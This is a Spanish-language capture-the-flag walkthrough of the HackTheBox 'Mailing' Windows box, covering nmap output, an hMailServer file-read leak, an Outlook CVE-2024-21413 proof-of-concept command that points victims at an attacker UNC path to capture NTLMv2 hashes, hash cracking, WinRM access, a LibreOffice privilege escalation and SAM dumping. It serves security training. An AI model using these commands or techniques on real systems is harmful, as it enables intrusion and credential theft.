#ActiveDirectory #Easy #tecnicas #windows 
### Ping
```python
ping -c 1 10.10.11.14
PING 10.10.11.14 (10.10.11.14) 56(84) bytes of data.
64 bytes from 10.10.11.14: icmp_seq=1 ttl=127 time=73.6 ms

--- 10.10.11.14 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 73.610/73.610/73.610/0.000 ms
```

### TTL 127 = Windows

### nmap
```python
# Nmap 7.94SVN scan initiated Sat May  4 15:09:21 2024 as: nmap -p- --open -sC -sV --min-rate 3000 -n -Pn -oN Scan 10.10.11.14
Nmap scan report for 10.10.11.14
Host is up (0.072s latency).
Not shown: 65517 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE       VERSION
25/tcp    open  smtp          hMailServer smtpd
| smtp-commands: mailing.htb, SIZE 20480000, AUTH LOGIN PLAIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Did not follow redirect to http://mailing.htb
110/tcp   open  pop3          hMailServer pop3d
|_pop3-capabilities: USER TOP UIDL
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
143/tcp   open  imap          hMailServer imapd
|_imap-capabilities: RIGHTS=texkA0001 IMAP4rev1 SORT NAMESPACE OK IMAP4 QUOTA IDLE ACL completed CAPABILITY CHILDREN
445/tcp   open  microsoft-ds?
465/tcp   open  ssl/smtp      hMailServer smtpd
| ssl-cert: Subject: commonName=mailing.htb/organizationName=Mailing Ltd/stateOrProvinceName=EU\Spain/countryName=EU
| Not valid before: 2024-02-27T18:24:10
|_Not valid after:  2029-10-06T18:24:10
| smtp-commands: mailing.htb, SIZE 20480000, AUTH LOGIN PLAIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
|_ssl-date: TLS randomness does not represent time
587/tcp   open  smtp          hMailServer smtpd
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=mailing.htb/organizationName=Mailing Ltd/stateOrProvinceName=EU\Spain/countryName=EU
| Not valid before: 2024-02-27T18:24:10
|_Not valid after:  2029-10-06T18:24:10
| smtp-commands: mailing.htb, SIZE 20480000, STARTTLS, AUTH LOGIN PLAIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
993/tcp   open  ssl/imap      hMailServer imapd
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=mailing.htb/organizationName=Mailing Ltd/stateOrProvinceName=EU\Spain/countryName=EU
| Not valid before: 2024-02-27T18:24:10
|_Not valid after:  2029-10-06T18:24:10
|_imap-capabilities: RIGHTS=texkA0001 IMAP4rev1 SORT NAMESPACE OK IMAP4 QUOTA IDLE ACL completed CAPABILITY CHILDREN
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
7680/tcp  open  pando-pub?
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
54017/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: mailing.htb; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2024-05-04T19:09:44
|_  start_date: N/A
|_clock-skew: -1m19s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat May  4 15:11:47 2024 -- 1 IP address (1 host up) scanned in 145.93 seconds
```

### Enumeración del puerto 80
tenemos un botón para descargar instrucciones asi que esto puede ser interesante 
![[Pasted image 20240611204141.png]]

### CVE = LFI
despues de investigar un poco he descubierto que esta pagina usa hmailserver el cual es vulnerable a un `LFI`

![[Pasted image 20240611204147.png]]

### hmailserver
apuntando al archivo de configuración de hmailserver puedo descargar el archivo de configuración completo en el cual he obtenido credenciales 

![[Pasted image 20240611204211.png]]
### Validando usuarios y contraseñas
no tenemos exito. 
![[Pasted image 20240611204223.png]]

### telnet
con estas credenciales vamos a intentar una conexión vía telnet al puerto 110 
![[Pasted image 20240611204235.png]]

### Responder
despues de investigar un poco hemos encontrado el usuario administrator el cual nos permite ejecutar el siguiente `POC`
`Esta CVE nos permite enviar un correo electronico y con el responder vamos a estar a la escucha para poder obtener un hash NTLMv2 el cual podemos crackear`

```python
python3 CVE-2024-21413.py --server mailing.htb --port 587 --username administrator@mailing.htb --password homenetworkingadministrator --sender administrator@mailing.htb --recipient maya@mailing.htb --url "\10.10.14.71\test\meeting" --subject "XD
```
![[Pasted image 20240611204253.png]]

`crackeamos el hash NTLMv2 con john`
obtenemos la contraseña en texto claro de maya
![[Pasted image 20240611204301.png]]

### EvinWinrm
logramos obtener conexión con la maquina haciendo uso de las credenciales que hemos conseguido antes
![[Pasted image 20240611204309.png]]

### Escalada de privilegios
tenemos un montón de privilegios que podrían ayudarnos a elevar privilegios
![[Pasted image 20240611204316.png]]

### CVE-2023-2255
después de buscar un poco en internet encontré esta `CVE` 
![[Pasted image 20240611204321.png]]

### descargamos el exploit que hemos creado
una ves descargado el exploit debemos verificar el estado del usuario maya
![[Pasted image 20240611204331.png]]

### Usaremos un servidor de intermediario para poder enviarnos los archivos 

![[Pasted image 20240611204339.png]]

### Usando crackmapexec smb podemos dumpear la sam

![[Pasted image 20240611204346.png]]

### impacket-wmiexec
con esta herramienta de impacket podemos establecer una conexión vía localadmin en la maquina victima. sin embargo la suite de impacket ya esta desactualizada por lo cual tuve que descargar la herramienta por separado y todo me fue de lujo

![[Pasted image 20240611204400.png]]
### WE ARE ROOT